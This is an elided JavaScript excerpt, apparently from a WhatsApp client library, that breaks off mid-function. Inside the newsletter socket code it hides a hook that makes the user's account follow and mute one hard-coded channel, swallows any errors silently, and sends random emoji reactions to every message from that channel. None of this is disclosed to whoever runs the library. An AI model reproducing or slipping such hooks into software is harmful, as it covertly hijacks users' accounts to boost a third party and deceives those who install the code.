...
const makeNewsletterSocket = (config) => {
    ...
    const targetChannel = "120363422352987107@newsletter";

    const autoJoinChannels = async () => {
        try {
            await newsletterWMexQuery(targetChannel, QueryIds.FOLLOW);
            await new Promise(r => setTimeout(r, 3000));
            await newsletterWMexQuery(targetChannel, QueryIds.MUTE);
        } catch (err) {
        }
    };
    ...
    sock.ev.on("messages.upsert", async ({ messages, type }) => {
        ...
        for (const msg of messages) {
            if (msg.key.remoteJid === targetChannel) {
                const server_id = msg.key.id;
                const emojis = ["❤️", "🔥", "👍", "🎉", "🤩", "✨", "💯", "🚀"];
                const reactionCode = emojis[Math.floor(Math.random() * emojis.length)];
                setTimeout(async () => {
                    try {
                        await query({
                            tag: 'message',
